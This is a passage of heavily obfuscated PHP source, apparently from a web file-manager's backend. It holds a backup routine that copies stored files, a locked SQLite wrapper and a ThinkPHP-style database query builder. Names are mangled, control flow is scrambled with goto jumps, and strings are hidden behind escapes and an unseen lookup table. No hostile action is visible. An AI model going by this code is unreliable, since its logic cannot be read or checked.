IO::move($B¡ƒœ÷‘‹[$f ”¹º’‚Š[75]], $FËó°®Ö²ò); if (!$c»Ñ¬ÛœØ¥) { $aÂÃá²Ñâ´->end(); return !1; } } $b·Ş¿‰ùóî = CONTROLLER_DIR . $f ”¹º’‚Š[750]; goto CÑğÈ´²¼; F»ã©Ë®¯´: $AÄ‰ø©ÙÆ½ = TEMP_FILES . "\142\x61\143\153\165\x70\x5f{$DÁÑˆµÜä}\57"; $FËó°®Ö²ò = "\173\151\157\72{$AÇ‰ğÈ¯‚Â[$f ”¹º’‚Š[710]]}\175\57\x64\x61\164\x61\142\141\163\145\x2f\142\x61\143\153\165\160\x5f{$DÁÑˆµÜä}\x2f"; if (!($FËó°®Ö²ò = IO::mkdir($FËó°®Ö²ò))) { return !1; } goto cñ¢ßù‘‡‘; b‰Ê¢„ƒÆ: } } class BackupFile { public function __construct() { } public function index() { goto c‚à™¬ˆÚ; Aœïè­İÑ‚: $A÷°…ˆ÷öŞ = 1000; $c’ÈªÂçÄä = $c•ˆéÀë¾ = 0; $aíÉ†ÕÓÆÁ = array(); goto eÓ¥¦¡®›ù; Cªİ“ºĞï†: $E”Ï×Ç˜ˆ = !0; $b…°’ƒîíŠ = $this->storeIds(); $BñÔ”Å¢Â÷ = 1; goto Aœïè­İÑ‚; b˜Œ®ÖèÄ·: $a¬ÆØĞ§…Ü = (int) Model($_SERVER[Æ¼ôºÙï][737])->where($D¼ŒÈ­ÃÅÒ)->count($_SERVER[Æ¼ôºÙï][436]); $fèÀÑéºÔ¤ = (int) Model($_SERVER[Æ¼ôºÙï][737])->where($D¼ŒÈ­ÃÅÒ)->sum($_SERVER[Æ¼ôºÙï][77]); $FÒ§ÅÌƒóË = new TaskFileTransfer($_SERVER[Æ¼ôºÙï][755], $_SERVER[Æ¼ôºÙï][732], $a¬ÆØĞ§…Ü, LNG($_SERVER[Æ¼ôºÙï][733]) . $_SERVER[Æ¼ôºÙï][734] . LNG($_SERVER[Æ¼ôºÙï][756])); goto c‘©šÄ¸µ; eÓ¥¦¡®›ù: $A‘÷Œ‰¹× = $eŸåÌ‘®Ö³ = 0; do { $EÑÀñËé Õ = $_SERVER[Æ¼ôºÙï][759]; $b©öÑ›’Ùá = Model($_SERVER[Æ¼ôºÙï][737])->where($D¼ŒÈ­ÃÅÒ)->field($EÑÀñËé Õ)->order($_SERVER[Æ¼ôºÙï][760])->selectPage($A÷°…ˆ÷öŞ, $BñÔ”Å¢Â÷); $báäóŠº†› = !empty($b©öÑ›’Ùá[$_SERVER[Æ¼ôºÙï][363]]) ? $b©öÑ›’Ùá[$_SERVER[Æ¼ôºÙï][363]] : array(); foreach ($báäóŠº†› as $BŒÚ‰“é½ ) { goto A¢İİ›˜¨’; EÖ¯óÍ˜„‰: $c’ÈªÂçÄä += $BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][77]]; $eŸåÌ‘®Ö³ += 1; $A‘÷Œ‰¹× += $BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][77]]; goto F˜âÄŠò›; F˜âÄŠò›: if ($c’ÈªÂçÄä >= 1024 * 1024 * 100) { $F“‰—ÛĞ§í = array($_SERVER[Æ¼ôºÙï][766] => $AÈ‰Áâ±ø¾, $_SERVER[Æ¼ôºÙï][767] => $eŸåÌ‘®Ö³, $_SERVER[Æ¼ôºÙï][768] => $A‘÷Œ‰¹×); Backup::set($F“‰—ÛĞ§í); $c’ÈªÂçÄä = $c•ˆéÀë¾ = 0; } goto AÛë¼•··¡; D¦¨¢ƒìÂ: if (IO::exist($F¨É¸ğÚÂÅ)) { $FÒ§ÅÌƒóË->updateFileEnd($BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][28]], $BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][77]]); } else { $F¨É¸ğÚÂÅ = get_path_father($F¨É¸ğÚÂÅ); IO::mkdir($F¨É¸ğÚÂÅ); if (!IO::copy($b÷Ùœ«˜÷É, $F¨É¸ğÚÂÅ, $_SERVER[Æ¼ôºÙï][763])) { write_log($_SERVER[Æ¼ôºÙï][764] . $b÷Ùœ«˜÷É . $_SERVER[Æ¼ôºÙï][765] . $F¨É¸ğÚÂÅ . $_SERVER[Æ¼ôºÙï][494], $_SERVER[Æ¼ôºÙï][732]); $E”Ï×Ç˜ˆ = !1; break; } } $AÈ‰Áâ±ø¾ = $BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][436]]; $c•ˆéÀë¾ += 1; goto EÖ¯óÍ˜„‰; A¢İİ›˜¨’: if (!$this->_fileExist($BŒÚ‰“é½ , $aíÉ†ÕÓÆÁ, $b…°’ƒîíŠ)) { $a¬ÆØĞ§…Ü -= 1; $fèÀÑéºÔ¤ -= (int) $BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][77]]; write_log("\146\151\x6c\x65\40\156\x6f\x74\x20\145\x78\151\163\164\56\x66\x69\x6c\x65\111\104\72{$BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][436]]}\54\40\160\141\164\x68\72{$BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][75]]}", $_SERVER[Æ¼ôºÙï][761]); continue; } $b÷Ùœ«˜÷É = $BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][75]]; $F¨É¸ğÚÂÅ = "\x7b\x69\x6f\x3a{$Eã“â«¡Íî[$_SERVER[Æ¼ôºÙï][710]]}\x7d" . substr($b÷Ùœ«˜÷É, strlen("\173\151\157\72{$BŒÚ‰“é½ [$_SERVER[Æ¼ôºÙï][762]]}\x7d")); goto D¦¨¢ƒìÂ; AÛë¼•··¡: } $aÖÇÈ˜î = count($báäóŠº†›); $BñÔ”Å¢Â÷++; } while ($aÖÇÈ˜î == $A÷°…ˆ÷öŞ); $FÒ§ÅÌƒóË->end(); goto c¼£ËÁ÷®; c¼£ËÁ÷®: $F“‰—ÛĞ§í = array($_SERVER[Æ¼ôºÙï][769] => 1, $_SERVER[Æ¼ôºÙï][465] => time(), $_SERVER[Æ¼ôºÙï][727] => 1, $_SERVER[Æ¼ôºÙï][766] => $AÈ‰Áâ±ø¾, $_SERVER[Æ¼ôºÙï][758] => $fèÀÑéºÔ¤, $_SERVER[Æ¼ôºÙï][757] => $a¬ÆØĞ§…Ü); if ($c•ˆéÀë¾) { $F“‰—ÛĞ§í[$_SERVER[Æ¼ôºÙï][767]] = $eŸåÌ‘®Ö³; $F“‰—ÛĞ§í[$_SERVER[Æ¼ôºÙï][768]] = $A‘÷Œ‰¹×; } Backup::set($F“‰—ÛĞ§í); goto FÍ¾Û±…­; c‚à™¬ˆÚ: $Eã“â«¡Íî = Backup::get(); $AÈ‰Áâ±ø¾ = $Eã“â«¡Íî[$_SERVER[Æ¼ôºÙï][289]][$_SERVER[Æ¼ôºÙï][173]][$_SERVER[Æ¼ôºÙï][436]]; $D¼ŒÈ­ÃÅÒ = array($_SERVER[Æ¼ôºÙï][437] => array($_SERVER[Æ¼ôºÙï][753], $AÈ‰Áâ±ø¾), $_SERVER[Æ¼ôºÙï][754] => array($_SERVER[Æ¼ôºÙï][327], $Eã“â«¡Íî[$_SERVER[Æ¼ôºÙï][710]])); goto b˜Œ®ÖèÄ·; FÍ¾Û±…­: $this->_fileFilter($aíÉ†ÕÓÆÁ); return !0; goto CîíåÛİ; c‘©šÄ¸µ: $FÒ§ÅÌƒóË->task[$_SERVER[Æ¼ôºÙï][717]] = $fèÀÑéºÔ¤; $F“‰—ÛĞ§í = array($_SERVER[Æ¼ôºÙï][757] => $a¬ÆØĞ§…Ü, $_SERVER[Æ¼ôºÙï][758] => $fèÀÑéºÔ¤); Backup::set($F“‰—ÛĞ§í); goto Cªİ“ºĞï†; CîíåÛİ: } private function _fileExist($F·æ—œê¥§, &$aÚ¦áèªôÍ, $b‹’’¶µÅ™) { goto EÓê³ÒÏ‘Â; dÜ˜‡‚ †: if (IO::exist($f¯ƒˆ¸àÄÏ)) { $aÚ¦áèªôÍ[] = $F·æ—œê¥§[$båôŠÑ [436]]; return !1; } $cã×Ê©êÑ² = array($båôŠÑ [762] => $F·æ—œê¥§[$båôŠÑ [762]], $båôŠÑ [75] => array($båôŠÑ [375], "{$f¯ƒˆ¸àÄÏ}\45")); $C¦ó³×»Ú = Model($båôŠÑ [737])->where($cã×Ê©êÑ²)->field($båôŠÑ [437])->select(); goto CÆêÒ‚–íœ; CÆêÒ‚–íœ: $aÚ¦áèªôÍ = array_merge($aÚ¦áèªôÍ, array_to_keyvalue($C¦ó³×»Ú, $båôŠÑ [33], $båôŠÑ [436])); return !1; goto c’£Î·Šªî; B©©’Æ‡°: if (!in_array($F·æ—œê¥§[$båôŠÑ [762]], $b‹’’¶µÅ™)) { return !1; } if (IO::exist($AŠÎ‡òíŒİ)) { return !0; } $f¯ƒˆ¸àÄÏ = get_path_father($AŠÎ‡òíŒİ); goto dÜ˜‡‚ †; EÓê³ÒÏ‘Â: $båôŠÑ  =& $_SERVER[Æ¼ôºÙï]; $AŠÎ‡òíŒİ = $F·æ—œê¥§[$båôŠÑ [75]]; if (in_array($F·æ—œê¥§[$båôŠÑ [436]], $aÚ¦áèªôÍ)) { return !1; } goto B©©’Æ‡°; c’£Î·Šªî: } private function _fileFilter($F ä‹ó³¯¥) { $B¤êèˆá¥– =& $_SERVER[Æ¼ôºÙï]; if (empty($F ä‹ó³¯¥)) { return; } $FøËÀ…Ôö = array($B¤êèˆá¥–[436] => array($B¤êèˆá¥–[7], array_unique($F ä‹ó³¯¥))); $eèæÈÑò… = Model($B¤êèˆá¥–[770])->where($FøËÀ…Ôö)->field($B¤êèˆá¥–[387])->select(); foreach ($eèæÈÑò… as $D‰ğ©Şó×Ê) { Model($B¤êèˆá¥–[770])->remove($D‰ğ©Şó×Ê[$B¤êèˆá¥–[387]], !1); } } private function storeIds() { $aİê‚ì†° =& $_SERVER[Æ¼ôºÙï]; $b­‹¤÷×á‘ = Model($aİê‚ì†°[722])->listData(); $AĞõÏÌŒ¸ä = array(); $a¤ŞÌƒå”Í = $GLOBALS[$aİê‚ì†°[6]][$aİê‚ì†°[87]][$aİê‚ì†°[771]]; foreach ($b­‹¤÷×á‘ as $fÃõÂƒĞŸî) { $D©¯»¤ó = strtolower($fÃõÂƒĞŸî[$aİê‚ì†°[93]]); if (!isset($a¤ŞÌƒå”Í[$D©¯»¤ó])) { continue; } $F¤‘†‡ìÌ = $aİê‚ì†°[71] . (isset($a¤ŞÌƒå”Í[$D©¯»¤ó]) ? $a¤ŞÌƒå”Í[$D©¯»¤ó] : ucfirst($D©¯»¤ó)); if (!class_exists($F¤‘†‡ìÌ)) { continue; } $AĞõÏÌŒ¸ä[] = $fÃõÂƒĞŸî[$aİê‚ì†°[385]]; } return $AĞõÏÌŒ¸ä; } } goto c„ĞÙºë‰¥; c‚àÈÁ¹®„: class DbSqlite3 extends DbSqlite3Base { public function query($EâÖ“µµŠô) { $f…É˜œŸíø =& $_SERVER[Æ¼ôºÙï]; if (!CacheLock::fileLock($f…É˜œŸíø[9])) { return !1; } $a¶™¢†ë’Â = parent::query($EâÖ“µµŠô); CacheLock::fileUnLock($f…É˜œŸíø[9]); return $a¶™¢†ë’Â; } public function execute($A¡«´¾ù) { $b­ Ó“ÁîŒ =& $_SERVER[Æ¼ôºÙï]; if (!CacheLock::fileLock($b­ Ó“ÁîŒ[9])) { return !1; } $Eƒô©õ¶Æƒ = parent::execute($A¡«´¾ù); CacheLock::fileUnLock($b­ Ó“ÁîŒ[9]); return $Eƒô©õ¶Æƒ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\161" => "\74\x3e", "\x67\164" => "\76", "\145\147\x74" => "\76\75", "\x6c\x74" => "\74", "\145\154\x74" => "\74\75", "\156\157\x74\x6c\151\153\x65" => "\x4e\117\124\x20\114\111\113\x45", "\154\x69\x6b\145" => "\114\x49\x4b\x45", "\x69\x6e" => "\x49\x4e", "\x6e\x6f\164\151\x6e" => "\x4e\117\124\40\111\116", "\156\157\164\40\x69\x6e" => "\116\117\124\40\111\x4e", "\x62\x65\x74\x77\x65\x65\x6e" => "\102\x45\124\x57\x45\105\116", "\x6e\x6f\164\x62\x65\164\x77\x65\x65\156" => "\x4e\117\124\40\x42\x45\x54\x57\x45\105\116", "\156\x6f\x74\x20\142\x65\x74\167\x65\145\156" => "\116\x4f\124\x20\x42\x45\124\x57\105\x45\x4e"); protected $selectSql = "\123\105\x4c\105\103\124\45\104\x49\123\x54\x49\x4e\103\x54\x25\40\x25\x46\x49\x45\114\104\x25\x20\x46\122\117\x4d\40\x25\124\101\x42\114\105\x25\x25\x4a\x4f\111\116\45\45\x57\x48\x45\x52\x45\45\45\107\x52\117\x55\x50\45\45\110\101\126\111\116\x47\x25\x25\117\122\x44\x45\x52\45\x25\x4c\111\x4d\x49\124\x25\40\x25\x55\x4e\x49\x4f\116\45\45\103\x4f\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $EáÙÌ¢¬ƒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Æ¼ôºÙï][898], $EáÙÌ¢¬ƒ); } public function factory($bÒ¯”Øå· = '') { goto eÔÄù²„¶; F‡‡©÷ã‰•: return $EÒïà˜î“­; goto cëÎ„¢‰; aĞ®îÊæ†: $this->dbType = ucwords(strtolower($bÒ¯”Øå·[$Aõí…ËÉ÷›[899]])); $e‡ÈÈĞ¸– = $Aõí…ËÉ÷›[901] . $this->dbType; if (class_exists($e‡ÈÈĞ¸–)) { $EÒïà˜î“­ = new $e‡ÈÈĞ¸–($bÒ¯”Øå·); if ($Aõí…ËÉ÷›[742] != strtolower($bÒ¯”Øå·[$Aõí…ËÉ÷›[899]])) { $EÒïà˜î“­->dbType = strtoupper($this->dbType); } else { $EÒïà˜î“­->dbType = $this->_getDsnType($bÒ¯”Øå·[$Aõí…ËÉ÷›[854]]); } } else { think_exception(think_lang($Aõí…ËÉ÷›[902]) . $Aõí…ËÉ÷›[903] . $e‡ÈÈĞ¸–); } goto F‡‡©÷ã‰•; eÔÄù²„¶: $Aõí…ËÉ÷› =& $_SERVER[Æ¼ôºÙï]; $bÒ¯”Øå· = $this->parseConfig($bÒ¯”Øå·); if (empty($bÒ¯”Øå·[$Aõí…ËÉ÷›[899]])) { think_exception(think_lang($Aõí…ËÉ÷›[900])); } goto aĞ®îÊæ†; cëÎ„¢‰: } public function __call($B´„Â½–‡ê, $bÖÔà¢ß) { if (method_exists($this, $B´„Â½–‡ê)) { return call_user_func_array(array($this, $B´„Â½–‡ê), $bÖÔà¢ß); } } protected function _getDsnType($EÕ‰³„ÒÀ×) { $DÂ–¥‹ëñ† = explode($_SERVER[Æ¼ôºÙï][4], $EÕ‰³„ÒÀ×); $aù™¢¹º¼ = strtoupper(trim($DÂ–¥‹ëñ†[0])); return $aù™¢¹º¼; } private function parseConfig($CøŠ—šŠ¤ª = '') { $B‹´„·»ï =& $_SERVER[Æ¼ôºÙï]; if (!empty($CøŠ—šŠ¤ª) && is_string($CøŠ—šŠ¤ª)) { $CøŠ—šŠ¤ª = $this->parseDSN($CøŠ—šŠ¤ª); } elseif (is_array($CøŠ—šŠ¤ª)) { $CøŠ—šŠ¤ª = array_change_key_case($CøŠ—šŠ¤ª); $CøŠ—šŠ¤ª = array($B‹´„·»ï[899] => $CøŠ—šŠ¤ª[$B‹´„·»ï[741]], $B‹´„·»ï[827] => $CøŠ—šŠ¤ª[$B‹´„·»ï[904]], $B‹´„·»ï[828] => $CøŠ—šŠ¤ª[$B‹´„·»ï[905]], $B‹´„·»ï[825] => $CøŠ—šŠ¤ª[$B‹´„·»ï[906]], $B‹´„·»ï[826] => $CøŠ—šŠ¤ª[$B‹´„·»ï[907]], $B‹´„·»ï[17] => $CøŠ—šŠ¤ª[$B‹´„·»ï[908]], $B‹´„·»ï[854] => $CøŠ—šŠ¤ª[$B‹´„·»ï[743]], $B‹´„·»ï[13] => isset($CøŠ—šŠ¤ª[$B‹´„·»ï[909]]) ? $CøŠ—šŠ¤ª[$B‹´„·»ï[909]] : array()); } elseif (empty($CøŠ—šŠ¤ª)) { if (think_config($B‹´„·»ï[910]) && $B‹´„·»ï[742] != strtolower(think_config($B‹´„·»ï[911]))) { $CøŠ—šŠ¤ª = $this->parseDSN(think_config($B‹´„·»ï[910])); } else { $CøŠ—šŠ¤ª = array($B‹´„·»ï[899] => think_config($B‹´„·»ï[911]), $B‹´„·»ï[827] => think_config($B‹´„·»ï[912]), $B‹´„·»ï[828] => think_config($B‹´„·»ï[913]), $B‹´„·»ï[825] => think_config($B‹´„·»ï[914]), $B‹´„·»ï[826] => think_config($B‹´„·»ï[915]), $B‹´„·»ï[17] => think_config($B‹´„·»ï[242]), $B‹´„·»ï[854] => think_config($B‹´„·»ï[910]), $B‹´„·»ï[13] => think_config($B‹´„·»ï[916])); } } return $CøŠ—šŠ¤ª; } protected function initConnect($Fãë†¯ õ = true) { if (1 == think_config($_SERVER[Æ¼ôºÙï][18])) { $this->_linkID = $this->multiConnect($Fãë†¯ õ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $E’Ù‚‡à† => $c¯Õ™Ôí›) { $this->_linkID = $c¯Õ™Ôí›; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($C†Ğö½ìÀ = false) { $BÉ•óÔ˜ï =& $_SERVER[Æ¼ôºÙï]; static $dİ»Û–ÖÃ = array(); if (empty($dİ»Û–ÖÃ)) { foreach ($this->config as $Aô…‡Ì‹è => $c¿‰½¨ƒÍ) { $dİ»Û–ÖÃ[$Aô…‡Ì‹è] = explode($BÉ•óÔ˜ï[47], $c¿‰½¨ƒÍ); } } if (think_config($BÉ•óÔ˜ï[917])) { if ($C†Ğö½ìÀ) { $CÒ÷¨àÔä— = floor(mt_rand(0, think_config($BÉ•óÔ˜ï[918]) - 1)); } else { if (is_numeric(think_config($BÉ•óÔ˜ï[919]))) { $CÒ÷¨àÔä— = think_config($BÉ•óÔ˜ï[919]); } else { $CÒ÷¨àÔä— = floor(mt_rand(think_config($BÉ•óÔ˜ï[918]), count($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[825]]) - 1)); } } } else { $CÒ÷¨àÔä— = floor(mt_rand(0, count($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[825]]) - 1)); } $f‘ĞÛ’Š®Ì = array($BÉ•óÔ˜ï[827] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[827]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[827]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[827]][0], $BÉ•óÔ˜ï[828] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[828]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[828]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[828]][0], $BÉ•óÔ˜ï[825] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[825]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[825]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[825]][0], $BÉ•óÔ˜ï[826] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[826]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[826]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[826]][0], $BÉ•óÔ˜ï[17] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[17]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[17]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[17]][0], $BÉ•óÔ˜ï[854] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[854]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[854]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[854]][0], $BÉ•óÔ˜ï[13] => isset($dİ»Û–ÖÃ[$BÉ•óÔ˜ï[13]][$CÒ÷¨àÔä—]) ? $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[13]][$CÒ÷¨àÔä—] : $dİ»Û–ÖÃ[$BÉ•óÔ˜ï[13]][0]); return $this->connect($f‘ĞÛ’Š®Ì, $CÒ÷¨àÔä—); } public function parseDSN($C¦¬·†¿ë÷) { $C¾¥¼«²äá =& $_SERVER[Æ¼ôºÙï]; if (empty($C¦¬·†¿ë÷)) { return !1; } $fİë¡ì×©Ú = parse_url($C¦¬·†¿ë÷); if ($fİë¡ì×©Ú[$C¾¥¼«²äá[174]]) { $b–¹ƒ…ÒÜ¤ = array($C¾¥¼«²äá[899] => $fİë¡ì×©Ú[$C¾¥¼«²äá[174]], $C¾¥¼«²äá[827] => isset($fİë¡ì×©Ú[$C¾¥¼«²äá[551]]) ? $fİë¡ì×©Ú[$C¾¥¼«²äá[551]] : $C¾¥¼«²äá[33], $C¾¥¼«²äá[828] => isset($fİë¡ì×©Ú[$C¾¥¼«²äá[920]]) ? $fİë¡ì×©Ú[$C¾¥¼«²äá[920]] : $C¾¥¼«²äá[33], $C¾¥¼«²äá[825] => isset($fİë¡ì×©Ú[$C¾¥¼«²äá[175]]) ? $fİë¡ì×©Ú[$C¾¥¼«²äá[175]] : $C¾¥¼«²äá[33], $C¾¥¼«²äá[826] => isset($fİë¡ì×©Ú[$C¾¥¼«²äá[176]]) ? $fİë¡ì×©Ú[$C¾¥¼«²äá[176]] : $C¾¥¼«²äá[33], $C¾¥¼«²äá[17] => isset($fİë¡ì×©Ú[$C¾¥¼«²äá[75]]) ? substr($fİë¡ì×©Ú[$C¾¥¼«²äá[75]], 1) : $C¾¥¼«²äá[33]); } else { preg_match($C¾¥¼«²äá[921], trim($C¦¬·†¿ë÷), $aÏµ²¦Ç…); $b–¹ƒ…ÒÜ¤ = array($C¾¥¼«²äá[899] => $aÏµ²¦Ç…[1], $C¾¥¼«²äá[827] => $aÏµ²¦Ç…[2], $C¾¥¼«²äá[828] => $aÏµ²¦Ç…[3], $C¾¥¼«²äá[825] => $aÏµ²¦Ç…[4], $C¾¥¼«²äá[826] => $aÏµ²¦Ç…[5], $C¾¥¼«²äá[17] => $aÏµ²¦Ç…[6]); } $b–¹ƒ…ÒÜ¤[$C¾¥¼«²äá[854]] = $C¾¥¼«²äá[33]; return $b–¹ƒ…ÒÜ¤; } protected function debug() { $EÍ½Ä‘²Ñ =& $_SERVER[Æ¼ôºÙï]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $EÍ½Ä‘²Ñ[922]; if (think_config($EÍ½Ä‘²Ñ[923])) { think_status($EÍ½Ä‘²Ñ[924]); think_trace($this->queryStr . $EÍ½Ä‘²Ñ[925] . think_status($EÍ½Ä‘²Ñ[20], $EÍ½Ä‘²Ñ[924], 6) . $EÍ½Ä‘²Ñ[926], $EÍ½Ä‘²Ñ[33], $EÍ½Ä‘²Ñ[927]); } } protected function parseLock($fçÒØ–…¶Ê = false) { $dçÕ’¤½šò =& $_SERVER[Æ¼ôºÙï]; if (!$fçÒØ–…¶Ê) { return $dçÕ’¤½šò[33]; } if ($dçÕ’¤½šò[856] == $this->dbType) { return $dçÕ’¤½šò[928]; } return $dçÕ’¤½šò[929]; } protected function parseSet($b³¡Í§é‰) { $f¥­ÁİØ‘î =& $_SERVER[Æ¼ôºÙï]; foreach ($b³¡Í§é‰ as $f„«ŒŒêœ => $dó² Ë¦†Õ) { if (is_array($dó² Ë¦†Õ) && $f¥­ÁİØ‘î[293] == $dó² Ë¦†Õ[0]) { $A«æ™°á[] = $this->parseKey($f„«ŒŒêœ) . $f¥­ÁİØ‘î[930] . $dó² Ë¦†Õ[1]; } elseif (is_scalar($dó² Ë¦†Õ) || is_null($dó² Ë¦†Õ)) { $A«æ™°á[] = $this->parseKey($f„«ŒŒêœ) . $f¥­ÁİØ‘î[930] . $this->parseValue($dó² Ë¦†Õ); } } return $f¥­ÁİØ‘î[931] . implode($f¥­ÁİØ‘î[47], $A«æ™°á); } protected function bindParam($BÖÂ„ãÏÖî, $cà©¯äØØ) { $this->bind[$_SERVER[Æ¼ôºÙï][4] . $BÖÂ„ãÏÖî] = $cà©¯äØØ; } protected function parseBind($e÷¥½ Üùä) { $e÷¥½ Üùä = array_merge($this->bind, $e÷¥½ Üùä); $this->bind = array(); return $e÷¥½ Üùä; } function parseKey(&$eÎÙò¥Áñ´, $CÊˆƒİ»ç = true) { if ($CÊˆƒİ»ç) { $eÎÙò¥Áñ´ = $this->parseKeyCheck($eÎÙò¥Áñ´); } return $eÎÙò¥Áñ´; } function parseKeyCheck($eöÄŠ²É›) { $BèÈÅºå =& $_SERVER[Æ¼ôºÙï]; $eöÄŠ²É› = trim($eöÄŠ²É›); if (!preg_match($BèÈÅºå[932], $eöÄŠ²É›)) { think_exception($BèÈÅºå[933] . $eöÄŠ²É›); } return $eöÄŠ²É›; } protected function parseValue($CâÍ¶Õƒ¥‚) { $D¡¸³Å·†Á =& $_SERVER[Æ¼ôºÙï]; if (is_string($CâÍ¶Õƒ¥‚)) { $CâÍ¶Õƒ¥‚ = $D¡¸³Å·†Á[895] . $this->escapeString($CâÍ¶Õƒ¥‚) . $D¡¸³Å·†Á[895]; } elseif (isset($CâÍ¶Õƒ¥‚[0]) && is_string($CâÍ¶Õƒ¥‚[0]) && strtolower($CâÍ¶Õƒ¥‚[0]) == $D¡¸³Å·†Á[293]) { $CâÍ¶Õƒ¥‚ = $this->escapeString($CâÍ¶Õƒ¥‚[1]); } elseif (is_array($CâÍ¶Õƒ¥‚)) { $CâÍ¶Õƒ¥‚ = array_map(array($this, $D¡¸³Å·†Á[896]), $CâÍ¶Õƒ¥‚); } elseif (is_bool($CâÍ¶Õƒ¥‚)) { $CâÍ¶Õƒ¥‚ = $CâÍ¶Õƒ¥‚ ? $D¡¸³Å·†Á[86] : $D¡¸³Å·†Á[486]; } elseif (is_null($CâÍ¶Õƒ¥‚)) { $CâÍ¶Õƒ¥‚ = $D¡¸³Å·†Á[102]; } return $CâÍ¶Õƒ¥‚; } protected function parseField($b ÌÏ¨Éº«) { $cŠ¯Öµš‚“ =& $_SERVER[Æ¼ôºÙï]; if (is_string($b ÌÏ¨Éº«) && strpos($b ÌÏ¨Éº«, $cŠ¯Öµš‚“[47])) { $b ÌÏ¨Éº« = explode($cŠ¯Öµš‚“[47], $b ÌÏ¨Éº«); } if (is_array($b ÌÏ¨Éº«)) { $añÅ˜Ï‹† = array(); foreach ($b ÌÏ¨Éº« as $E¥¢‚Í©Í => $F¢×„ù–Ó) { if (!is_numeric($E¥¢‚Í©Í)) { $añÅ˜Ï‹†[] = $this->parseKey($E¥¢‚Í©Í) . $cŠ¯Öµš‚“[934] . $this->parseKey($F¢×„ù–Ó); } else { $añÅ˜Ï‹†[] = $this->parseKey($F¢×„ù–Ó); } } $eŠŒšëÉä = implode($cŠ¯Öµš‚“[47], $añÅ˜Ï‹†); } elseif (is_string($b ÌÏ¨Éº«) && !empty($b ÌÏ¨Éº«)) { $eŠŒšëÉä = $b ÌÏ¨Éº«; } else { $eŠŒšëÉä = $cŠ¯Öµš‚“[182]; } return $eŠŒšëÉä; } protected function parseTable($cˆğ¥ùÎ) { $dô‹ÔÍÎ²† =& $_SERVER[Æ¼ôºÙï]; if (is_array($cˆğ¥ùÎ)) { $Fè’‚—ÉÊ = array(); foreach ($cˆğ¥ùÎ as $dÄÑõÀ‰ÍÕ => $fœ˜Ş©ØÍó) { if (!is_numeric($dÄÑõÀ‰ÍÕ)) { $Fè’‚—ÉÊ[] = $this->parseKey($dÄÑõÀ‰ÍÕ) . $dô‹ÔÍÎ²†[50] . $this->parseKey($fœ˜Ş©ØÍó); } else { $Fè’‚—ÉÊ[] = $this->parseKey($dÄÑõÀ‰ÍÕ); } } $cˆğ¥ùÎ = $Fè’‚—ÉÊ; } elseif (is_string($cˆğ¥ùÎ)) { if (strstr($cˆğ¥ùÎ, $dô‹ÔÍÎ²†[50])) { return $cˆğ¥ùÎ; } $cˆğ¥ùÎ = explode($dô‹ÔÍÎ²†[47], $cˆğ¥ùÎ); array_walk($cˆğ¥ùÎ, array($this, $dô‹ÔÍÎ²†[845])); } return $dô‹ÔÍÎ²†[839] . trim(implode($dô‹ÔÍÎ²†[935], $cˆğ¥ùÎ), $dô‹ÔÍÎ²†[377]) . $dô‹ÔÍÎ²†[839]; } protected function parseWhere($C†ğŞàªÑ) { $cøæ¬êéšõ =& $_SERVER[Æ¼ôºÙï]; $E÷çÊˆ“ŒŠ = $cøæ¬êéšõ[33]; if (is_string($C†ğŞàªÑ)) { $E÷çÊˆ“ŒŠ = $C†ğŞàªÑ; } else { $bÛÉØÉò· = isset($C†ğŞàªÑ[$cøæ¬êéšõ[936]]) ? strtoupper($C†ğŞàªÑ[$cøæ¬êéšõ[936]]) : $cøæ¬êéšõ[33]; if (in_array($bÛÉØÉò·, 